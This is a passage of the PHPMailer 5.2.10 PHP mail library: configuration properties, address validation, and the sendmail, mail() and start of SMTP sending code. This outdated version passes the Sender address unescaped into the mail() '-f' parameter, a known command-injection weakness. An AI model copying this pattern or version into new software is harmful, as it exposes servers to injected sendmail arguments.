 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 */
class PHPMailer
{
    /**
     * The PHPMailer Version number.
     * @type string
     */
    public $Version = '5.2.10';

    /**
     * Email priority.
     * Options: 1 = High, 3 = Normal, 5 = low.
     * @type integer
     */
    public $Priority = 3;

    /**
     * The character set of the message.
     * @type string
     */
    public $CharSet = 'iso-8859-1';

    /**
     * The MIME Content-type of the message.
     * @type string
     */
    public $ContentType = 'text/plain';

    /**
     * The message encoding.
     * Options: "8bit", "7bit", "binary", "base64", and "quoted-printable".
     * @type string
     */
    public $Encoding = '8bit';

    /**
     * Holds the most recent mailer error message.
     * @type string
     */
    public $ErrorInfo = '';

    /**
     * The From email address for the message.
     * @type string
     */
    public $From = 'root@localhost';

    /**
     * The From name of the message.
     * @type string
     */
    public $FromName = 'Root User';

    /**
     * The Sender email (Return-Path) of the message.
     * If not empty, will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
     * @type string
     */
    public $Sender = '';

    /**
     * The Return-Path of the message.
     * If empty, it will be set to either From or Sender.
     * @type string
     * @deprecated Email senders should never set a return-path header;
     * it's the receiver's job (RFC5321 section 4.4), so this no longer does anything.
     * @link https://tools.ietf.org/html/rfc5321#section-4.4 RFC5321 reference
     */
    public $ReturnPath = '';

    /**
     * The Subject of the message.
     * @type string
     */
    public $Subject = '';

    /**
     * An HTML or plain text message body.
     * If HTML then call isHTML(true).
     * @type string
     */
    public $Body = '';

    /**
     * The plain-text message body.
     * This body can be read by mail clients that do not have HTML email
     * capability such as mutt & Eudora.
     * Clients that can read HTML will view the normal Body.
     * @type string
     */
    public $AltBody = '';

    /**
     * An iCal message part body.
     * Only supported in simple alt or alt_inline message types
     * To generate iCal events, use the bundled extras/EasyPeasyICS.php class or iCalcreator
     * @link http://sprain.ch/blog/downloads/php-class-easypeasyics-create-ical-files-with-php/
     * @link http://kigkonsult.se/iCalcreator/
     * @type string
     */
    public $Ical = '';

    /**
     * The complete compiled MIME message body.
     * @access protected
     * @type string
     */
    protected $MIMEBody = '';

    /**
     * The complete compiled MIME message headers.
     * @type string
     * @access protected
     */
    protected $MIMEHeader = '';

    /**
     * Extra headers that createHeader() doesn't fold in.
     * @type string
     * @access protected
     */
    protected $mailHeader = '';

    /**
     * Word-wrap the message body to this number of chars.
     * Set to 0 to not wrap. A useful value here is 78, for RFC2822 section 2.1.1 compliance.
     * @type integer
     */
    public $WordWrap = 0;

    /**
     * Which method to use to send mail.
     * Options: "mail", "sendmail", or "smtp".
     * @type string
     */
    public $Mailer = 'mail';

    /**
     * The path to the sendmail program.
     * @type string
     */
    public $Sendmail = '/usr/sbin/sendmail';

    /**
     * Whether mail() uses a fully sendmail-compatible MTA.
     * One which supports sendmail's "-oi -f" options.
     * @type boolean
     */
    public $UseSendmailOptions = true;

    /**
     * Path to PHPMailer plugins.
     * Useful if the SMTP class is not in the PHP include path.
     * @type string
     * @deprecated Should not be needed now there is an autoloader.
     */
    public $PluginDir = '';

    /**
     * The email address that a reading confirmation should be sent to.
     * @type string
     */
    public $ConfirmReadingTo = '';

    /**
     * The hostname to use in Message-Id and Received headers
     * and as default HELO string.
     * If empty, the value returned
     * by SERVER_NAME is used or 'localhost.localdomain'.
     * @type string
     */
    public $Hostname = '';

    /**
     * An ID to be used in the Message-Id header.
     * If empty, a unique id will be generated.
     * @type string
     */
    public $MessageID = '';

    /**
     * The message Date to be used in the Date header.
     * If empty, the current date will be added.
     * @type string
     */
    public $MessageDate = '';

    /**
     * SMTP hosts.
     * Either a single hostname or multiple semicolon-delimited hostnames.
     * You can also specify a different port
     * for each host by using this format: [hostname:port]
     * (e.g. "smtp1.example.com:25;smtp2.example.com").
     * You can also specify encryption type, for example:
     * (e.g. "tls://smtp1.example.com:587;ssl://smtp2.example.com:465").
     * Hosts will be tried in order.
     * @type string
     */
    public $Host = 'localhost';

    /**
     * The default SMTP server port.
     * @type integer
     * @TODO Why is this needed when the SMTP class takes care of it?
     */
    public $Port = 25;

    /**
     * The SMTP HELO of the message.
     * Default is $Hostname.
     * @type string
     * @see PHPMailer::$Hostname
     */
    public $Helo = '';

    /**
     * What kind of encryption to use on the SMTP connection.
     * Options: '', 'ssl' or 'tls'
     * @type string
     */
    public $SMTPSecure = '';

    /**
     * Whether to enable TLS encryption automatically if a server supports it,
     * even if `SMTPSecure` is not set to 'tls'.
     * Be aware that in PHP >= 5.6 this requires that the server's certificates are valid.
     * @type boolean
     */
    public $SMTPAutoTLS = true;

    /**
     * Whether to use SMTP authentication.
     * Uses the Username and Password properties.
     * @type boolean
     * @see PHPMailer::$Username
     * @see PHPMailer::$Password
     */
    public $SMTPAuth = false;

    /**
     * Options array passed to stream_context_create when connecting via SMTP.
     * @type array
     */
    public $SMTPOptions = array();

    /**
     * SMTP username.
     * @type string
     */
    public $Username = '';

    /**
     * SMTP password.
     * @type string
     */
    public $Password = '';

    /**
     * SMTP auth type.
     * Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5
     * @type string
     */
    public $AuthType = '';

    /**
     * SMTP realm.
     * Used for NTLM auth
     * @type string
     */
    public $Realm = '';

    /**
     * SMTP workstation.
     * Used for NTLM auth
     * @type string
     */
    public $Workstation = '';

    /**
     * The SMTP server timeout in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * @type integer
     */
    public $Timeout = 300;

    /**
     * SMTP class debug output mode.
     * Debug output level.
     * Options:
     * * `0` No output
     * * `1` Commands
     * * `2` Data and commands
     * * `3` As 2 plus connection status
     * * `4` Low-level data output
     * @type integer
     * @see SMTP::$do_debug
     */
    public $SMTPDebug = 0;

    /**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $mail->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @type string|callable
     * @see SMTP::$Debugoutput
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to keep SMTP connection open after each message.
     * If this is set to true then to close the connection
     * requires an explicit call to smtpClose().
     * @type boolean
     */
    public $SMTPKeepAlive = false;

    /**
     * Whether to split multiple to addresses into multiple messages
     * or send them all in one message.
     * @type boolean
     */
    public $SingleTo = false;

    /**
     * Storage for addresses when SingleTo is enabled.
     * @type array
     * @TODO This should really not be public
     */
    public $SingleToArray = array();

    /**
     * Whether to generate VERP addresses on send.
     * Only applicable when sending via SMTP.
     * @link http://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Postfix VERP info
     * @type boolean
     */
    public $do_verp = false;

    /**
     * Whether to allow sending messages with an empty body.
     * @type boolean
     */
    public $AllowEmpty = false;

    /**
     * The default line ending.
     * @note The default remains "\n". We force CRLF where we know
     *        it must be used via self::CRLF.
     * @type string
     */
    public $LE = "\n";

    /**
     * DKIM selector.
     * @type string
     */
    public $DKIM_selector = '';

    /**
     * DKIM Identity.
     * Usually the email address used as the source of the email
     * @type string
     */
    public $DKIM_identity = '';

    /**
     * DKIM passphrase.
     * Used if your key is encrypted.
     * @type string
     */
    public $DKIM_passphrase = '';

    /**
     * DKIM signing domain name.
     * @example 'example.com'
     * @type string
     */
    public $DKIM_domain = '';

    /**
     * DKIM private key file path.
     * @type string
     */
    public $DKIM_private = '';

    /**
     * Callback Action function name.
     *
     * The function that handles the result of the send email action.
     * It is called out by send() for each email sent.
     *
     * Value can be any php callable: http://www.php.net/is_callable
     *
     * Parameters:
     *   boolean $result        result of the send action
     *   string  $to            email address of the recipient
     *   string  $cc            cc email addresses
     *   string  $bcc           bcc email addresses
     *   string  $subject       the subject
     *   string  $body          the email body
     *   string  $from          email address of sender
     * @type string
     */
    public $action_function = '';

    /**
     * What to put in the X-Mailer header.
     * Options: An empty string for PHPMailer default, whitespace for none, or a string to use
     * @type string
     */
    public $XMailer = '';

    /**
     * An instance of the SMTP sender class.
     * @type SMTP
     * @access protected
     */
    protected $smtp = null;

    /**
     * The array of 'to' addresses.
     * @type array
     * @access protected
     */
    protected $to = array();

    /**
     * The array of 'cc' addresses.
     * @type array
     * @access protected
     */
    protected $cc = array();

    /**
     * The array of 'bcc' addresses.
     * @type array
     * @access protected
     */
    protected $bcc = array();

    /**
     * The array of reply-to names and addresses.
     * @type array
     * @access protected
     */
    protected $ReplyTo = array();

    /**
     * An array of all kinds of addresses.
     * Includes all of $to, $cc, $bcc
     * @type array
     * @access protected
     */
    protected $all_recipients = array();

    /**
     * The array of attachments.
     * @type array
     * @access protected
     */
    protected $attachment = array();

    /**
     * The array of custom headers.
     * @type array
     * @access protected
     */
    protected $CustomHeader = array();

    /**
     * The most recent Message-ID (including angular brackets).
     * @type string
     * @access protected
     */
    protected $lastMessageID = '';

    /**
     * The message's MIME type.
     * @type string
     * @access protected
     */
    protected $message_type = '';

    /**
     * The array of MIME boundary strings.
     * @type array
     * @access protected
     */
    protected $boundary = array();

    /**
     * The array of available languages.
     * @type array
     * @access protected
     */
    protected $language = array();

    /**
     * The number of errors encountered.
     * @type integer
     * @access protected
     */
    protected $error_count = 0;

    /**
     * The S/MIME certificate file path.
     * @type string
     * @access protected
     */
    protected $sign_cert_file = '';

    /**
     * The S/MIME key file path.
     * @type string
     * @access protected
     */
    protected $sign_key_file = '';

    /**
     * The optional S/MIME extra certificates ("CA Chain") file path.
     * @type string
     * @access protected
     */
    protected $sign_extracerts_file = '';

    /**
     * The S/MIME password for the key.
     * Used only if the key is encrypted.
     * @type string
     * @access protected
     */
    protected $sign_key_pass = '';

    /**
     * Whether to throw exceptions for errors.
     * @type boolean
     * @access protected
     */
    protected $exceptions = false;

    /**
     * Unique ID used for message ID and boundaries.
     * @type string
     * @access protected
     */
    protected $uniqueid = '';

    /**
     * Error severity: message only, continue processing.
     */
    const STOP_MESSAGE = 0;

    /**
     * Error severity: message, likely ok to continue processing.
     */
    const STOP_CONTINUE = 1;

    /**
     * Error severity: message, plus full stop, critical error reached.
     */
    const STOP_CRITICAL = 2;

    /**
     * SMTP RFC standard line ending.
     */
    const CRLF = "\r\n";

    /**
     * The maximum line length allowed by RFC 2822 section 2.1.1
     * @type integer
     */
    const MAX_LINE_LENGTH = 998;

    /**
     * Constructor.
     * @param boolean $exceptions Should we throw external exceptions?
     */
    public function __construct($exceptions = false)
    {
        $this->exceptions = (boolean)$exceptions;
    }

    /**
     * Destructor.
     */
    public function __destruct()
    {
        //Close any open SMTP connection nicely
        if ($this->Mailer == 'smtp') {
            $this->smtpClose();
        }
    }

    /**
     * Call mail() in a safe_mode-aware fashion.
     * Also, unless sendmail_path points to sendmail (or something that
     * claims to be sendmail), don't pass params (not a perfect fix,
     * but it will do)
     * @param string $to To
     * @param string $subject Subject
     * @param string $body Message Body
     * @param string $header Additional Header(s)
     * @param string $params Params
     * @access private
     * @return boolean
     */
    private function mailPassthru($to, $subject, $body, $header, $params)
    {
        //Check overloading of mail function to avoid double-encoding
        if (ini_get('mbstring.func_overload') & 1) {
            $subject = $this->secureHeader($subject);
        } else {
            $subject = $this->encodeHeader($this->secureHeader($subject));
        }
        if (ini_get('safe_mode') || !($this->UseSendmailOptions)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
        return $result;
    }

    /**
     * Output debugging info via user-defined method.
     * Only generates output if SMTP debug output is enabled (@see SMTP::$do_debug).
     * @see PHPMailer::$Debugoutput
     * @see PHPMailer::$SMTPDebug
     * @param string $str
     */
    protected function edebug($str)
    {
        if ($this->SMTPDebug <= 0) {
            return;
        }
        //Avoid clash with built-in function names
        if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->SMTPDebug);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Normalize line breaks
                $str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
                    "\n",
                    "\n                   \t                  ",
                    trim($str)
                ) . "\n";
        }
    }

    /**
     * Sets message type to HTML or plain.
     * @param boolean $isHtml True for HTML mode.
     * @return void
     */
    public function isHTML($isHtml = true)
    {
        if ($isHtml) {
            $this->ContentType = 'text/html';
        } else {
            $this->ContentType = 'text/plain';
        }
    }

    /**
     * Send messages using SMTP.
     * @return void
     */
    public function isSMTP()
    {
        $this->Mailer = 'smtp';
    }

    /**
     * Send messages using PHP's mail() function.
     * @return void
     */
    public function isMail()
    {
        $this->Mailer = 'mail';
    }

    /**
     * Send messages using $Sendmail.
     * @return void
     */
    public function isSendmail()
    {
        $ini_sendmail_path = ini_get('sendmail_path');

        if (!stristr($ini_sendmail_path, 'sendmail')) {
            $this->Sendmail = '/usr/sbin/sendmail';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'sendmail';
    }

    /**
     * Send messages using qmail.
     * @return void
     */
    public function isQmail()
    {
        $ini_sendmail_path = ini_get('sendmail_path');

        if (!stristr($ini_sendmail_path, 'qmail')) {
            $this->Sendmail = '/var/qmail/bin/qmail-inject';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'qmail';
    }

    /**
     * Add a "To" address.
     * @param string $address
     * @param string $name
     * @return boolean true on success, false if address already used
     */
    public function addAddress($address, $name = '')
    {
        return $this->addAnAddress('to', $address, $name);
    }

    /**
     * Add a "CC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address
     * @param string $name
     * @return boolean true on success, false if address already used
     */
    public function addCC($address, $name = '')
    {
        return $this->addAnAddress('cc', $address, $name);
    }

    /**
     * Add a "BCC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address
     * @param string $name
     * @return boolean true on success, false if address already used
     */
    public function addBCC($address, $name = '')
    {
        return $this->addAnAddress('bcc', $address, $name);
    }

    /**
     * Add a "Reply-to" address.
     * @param string $address
     * @param string $name
     * @return boolean
     */
    public function addReplyTo($address, $name = '')
    {
        return $this->addAnAddress('Reply-To', $address, $name);
    }

    /**
     * Add an address to one of the recipient arrays.
     * Addresses that have been added already return false, but do not throw exceptions
     * @param string $kind One of 'to', 'cc', 'bcc', 'ReplyTo'
     * @param string $address The email address to send to
     * @param string $name
     * @throws phpmailerException
     * @return boolean true on success, false if address already used or invalid in some way
     * @access protected
     */
    protected function addAnAddress($kind, $address, $name = '')
    {
        if (!preg_match('/^(to|cc|bcc|Reply-To)$/', $kind)) {
            $this->setError($this->lang('Invalid recipient array') . ': ' . $kind);
            $this->edebug($this->lang('Invalid recipient array') . ': ' . $kind);
            if ($this->exceptions) {
                throw new phpmailerException('Invalid recipient array: ' . $kind);
            }
            return false;
        }
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        if (!$this->validateAddress($address)) {
            $this->setError($this->lang('invalid_address') . ': ' . $address);
            $this->edebug($this->lang('invalid_address') . ': ' . $address);
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('invalid_address') . ': ' . $address);
            }
            return false;
        }
        if ($kind != 'Reply-To') {
            if (!isset($this->all_recipients[strtolower($address)])) {
                array_push($this->$kind, array($address, $name));
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = array($address, $name);
                return true;
            }
        }
        return false;
    }

    /**
     * Set the From and FromName properties.
     * @param string $address
     * @param string $name
     * @param boolean $auto Whether to also set the Sender address, defaults to true
     * @throws phpmailerException
     * @return boolean
     */
    public function setFrom($address, $name = '', $auto = true)
    {
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        if (!$this->validateAddress($address)) {
            $this->setError($this->lang('invalid_address') . ': ' . $address);
            $this->edebug($this->lang('invalid_address') . ': ' . $address);
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('invalid_address') . ': ' . $address);
            }
            return false;
        }
        $this->From = $address;
        $this->FromName = $name;
        if ($auto) {
            if (empty($this->Sender)) {
                $this->Sender = $address;
            }
        }
        return true;
    }

    /**
     * Return the Message-ID header of the last email.
     * Technically this is the value from the last time the headers were created,
     * but it's also the message ID of the last sent message except in
     * pathological cases.
     * @return string
     */
    public function getLastMessageID()
    {
        return $this->lastMessageID;
    }

    /**
     * Check that a string looks like an email address.
     * @param string $address The email address to check
     * @param string $patternselect A selector for the validation pattern to use :
     * * `auto` Pick strictest one automatically;
     * * `pcre8` Use the squiloople.com pattern, requires PCRE > 8.0, PHP >= 5.3.2, 5.2.14;
     * * `pcre` Use old PCRE implementation;
     * * `php` Use PHP built-in FILTER_VALIDATE_EMAIL; same as pcre8 but does not allow 'dotless' domains;
     * * `html5` Use the pattern given by the HTML5 spec for 'email' type form input elements.
     * * `noregex` Don't use a regex: super fast, really dumb.
     * @return boolean
     * @static
     * @access public
     */
    public static function validateAddress($address, $patternselect = 'auto')
    {
        if (!$patternselect or $patternselect == 'auto') {
            //Check this constant first so it works when extension_loaded() is disabled by safe mode
            //Constant was added in PHP 5.2.4
            if (defined('PCRE_VERSION')) {
                //This pattern can get stuck in a recursive loop in PCRE <= 8.0.2
                if (version_compare(PCRE_VERSION, '8.0.3') >= 0) {
                    $patternselect = 'pcre8';
                } else {
                    $patternselect = 'pcre';
                }
            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
                //Fall back to older PCRE
                $patternselect = 'pcre';
            } else {
                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
                    $patternselect = 'php';
                } else {
                    $patternselect = 'noregex';
                }
            }
        }
        switch ($patternselect) {
            case 'pcre8':
                /**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (boolean)preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'pcre':
                //An older regex that doesn't need a recent PCRE
                return (boolean)preg_match(
                    '/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>' .
                    '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' .
                    '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' .
                    '@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})' .
                    '(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:' .
                    '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' .
                    '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' .
                    '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' .
                    '::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',
                    $address
                );
            case 'html5':
                /**
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (boolean)preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'noregex':
                //No PCRE! Do something _very_ approximate!
                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
                return (strlen($address) >= 3
                    and strpos($address, '@') >= 1
                    and strpos($address, '@') != strlen($address) - 1);
            case 'php':
            default:
                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }

    /**
     * Create a message and send it.
     * Uses the sending method specified by $Mailer.
     * @throws phpmailerException
     * @return boolean false on error - See the ErrorInfo property for details of the error.
     */
    public function send()
    {
        try {
            if (!$this->preSend()) {
                return false;
            }
            return $this->postSend();
        } catch (phpmailerException $exc) {
            $this->mailHeader = '';
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    /**
     * Prepare a message for sending.
     * @throws phpmailerException
     * @return boolean
     */
    public function preSend()
    {
        try {
            $this->mailHeader = '';
            if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
                throw new phpmailerException($this->lang('provide_address'), self::STOP_CRITICAL);
            }

            // Set whether the message is multipart/alternative
            if (!empty($this->AltBody)) {
                $this->ContentType = 'multipart/alternative';
            }

            $this->error_count = 0; // Reset errors
            $this->setMessageType();
            // Refuse to send an empty message unless we are specifically allowing it
            if (!$this->AllowEmpty and empty($this->Body)) {
                throw new phpmailerException($this->lang('empty_message'), self::STOP_CRITICAL);
            }

            // Create body before headers in case body makes changes to headers (e.g. altering transfer encoding)
            $this->MIMEHeader = '';
            $this->MIMEBody = $this->createBody();
            // createBody may have added some headers, so retain them
            $tempheaders = $this->MIMEHeader;
            $this->MIMEHeader = $this->createHeader();
            $this->MIMEHeader .= $tempheaders;

            // To capture the complete message when using mail(), create
            // an extra header list which createHeader() doesn't fold in
            if ($this->Mailer == 'mail') {
                if (count($this->to) > 0) {
                    $this->mailHeader .= $this->addrAppend('To', $this->to);
                } else {
                    $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;');
                }
                $this->mailHeader .= $this->headerLine(
                    'Subject',
                    $this->encodeHeader($this->secureHeader(trim($this->Subject)))
                );
            }

            // Sign with DKIM if enabled
            if (!empty($this->DKIM_domain)
                && !empty($this->DKIM_private)
                && !empty($this->DKIM_selector)
                && file_exists($this->DKIM_private)) {
                $header_dkim = $this->DKIM_Add(
                    $this->MIMEHeader . $this->mailHeader,
                    $this->encodeHeader($this->secureHeader($this->Subject)),
                    $this->MIMEBody
                );
                $this->MIMEHeader = rtrim($this->MIMEHeader, "\r\n ") . self::CRLF .
                    str_replace("\r\n", "\n", $header_dkim) . self::CRLF;
            }
            return true;
        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    /**
     * Actually send a message.
     * Send the email via the selected mechanism
     * @throws phpmailerException
     * @return boolean
     */
    public function postSend()
    {
        try {
            // Choose the mailer and send through it
            switch ($this->Mailer) {
                case 'sendmail':
                case 'qmail':
                    return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
                case 'smtp':
                    return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
                case 'mail':
                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
                default:
                    $sendMethod = $this->Mailer.'Send';
                    if (method_exists($this, $sendMethod)) {
                        return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                    }

                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
            }
        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
        }
        return false;
    }

    /**
     * Send mail using the $Sendmail program.
     * @param string $header The message headers
     * @param string $body The message body
     * @see PHPMailer::$Sendmail
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
    protected function sendmailSend($header, $body)
    {
        if ($this->Sender != '') {
            if ($this->Mailer == 'qmail') {
                $sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
            } else {
                $sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
            }
        } else {
            if ($this->Mailer == 'qmail') {
                $sendmail = sprintf('%s', escapeshellcmd($this->Sendmail));
            } else {
                $sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));
            }
        }
        if ($this->SingleTo) {
            foreach ($this->SingleToArray as $toAddr) {
                if (!@$mail = popen($sendmail, 'w')) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
                fputs($mail, 'To: ' . $toAddr . "\n");
                fputs($mail, $header);
                fputs($mail, $body);
                $result = pclose($mail);
                $this->doCallback(
                    ($result == 0),
                    array($toAddr),
                    $this->cc,
                    $this->bcc,
                    $this->Subject,
                    $body,
                    $this->From
                );
                if ($result != 0) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
            }
        } else {
            if (!@$mail = popen($sendmail, 'w')) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
            fputs($mail, $header);
            fputs($mail, $body);
            $result = pclose($mail);
            $this->doCallback(($result == 0), $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            if ($result != 0) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
        }
        return true;
    }

    /**
     * Send mail using the PHP mail() function.
     * @param string $header The message headers
     * @param string $body The message body
     * @link http://www.php.net/manual/en/book.mail.php
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        if (empty($this->Sender)) {
            $params = ' ';
        } else {
            $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo && count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            }
        } else {
            $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
        }
        if (isset($old_from)) {
            ini_set('sendmail_from', $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
        }
        return true;
    }
    /**
     * Get an instance to use for SMTP operations.
     * Override this function to load your own SMTP implementation
     * @return SMTP
     */
    public function getSMTPInstance()
    {
        if (!is_object($this->smtp)) {
            $this->smtp = new SMTP;
        }
        return $this->smtp;
    }

    protected function smtpSend($header, $body)
    {
        $bad_rcpt = array();
        if (!$this->smtpConnect($this->SMTPOptions)) {
            throw new phpmailerException($this->lang('smtp_connect_failed'), self::STOP_CRITICAL);
        }
        if ('' == $this->Sender) {
            $smtp_from = $this->From;
        } else {
            $smtp_from = $this->Sender;
        }
        if (!$this->smtp->mail($smtp_from)) {
            $this->setError($this->lang('from_failed') . $smtp_from . ' : ' . implode(',', $this->smtp->getError()));
            throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL);
        }

        // Attempt to send to all recipients
